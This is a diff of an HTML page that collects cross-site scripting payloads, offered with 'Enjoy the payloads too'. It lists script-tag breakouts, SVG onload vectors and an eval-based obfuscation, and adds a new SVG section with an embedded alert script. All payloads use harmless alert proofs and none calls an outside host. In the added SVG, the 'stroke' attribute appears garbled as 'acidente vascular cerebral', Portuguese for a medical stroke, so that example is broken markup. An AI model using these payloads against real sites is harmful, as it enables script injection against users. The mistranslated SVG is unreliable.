@@ -18,6 +18,7 @@
 "<script>alert(1)</script>"@example.com
 </xmp>
 
+    
 "><svg/onload=alert(1)>
 <img>/><svg/onload=alert(1)>
 "></\/\</script><script>alert(1)</script>
@@ -27,7 +28,16 @@
 </style><script>a=eval;b=alert;a(b(/XSS/.source));</script>
 That's all for now that I'll share.
 Enjoy the payloads too. ;)
-    
+
+<h2>SVG</h2>
+<xmp>
+<svg version="1.1" baseProfile="full" xmlns=" http://www.w3.org/2000/svg "> 
+   <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" acidente vascular cerebral="#004400"/> 
+   <script type="text/javascript"> 
+      alert('XSS!'); 
+   </script> 
+</svg>
+</xmp>
 
    
 </div>
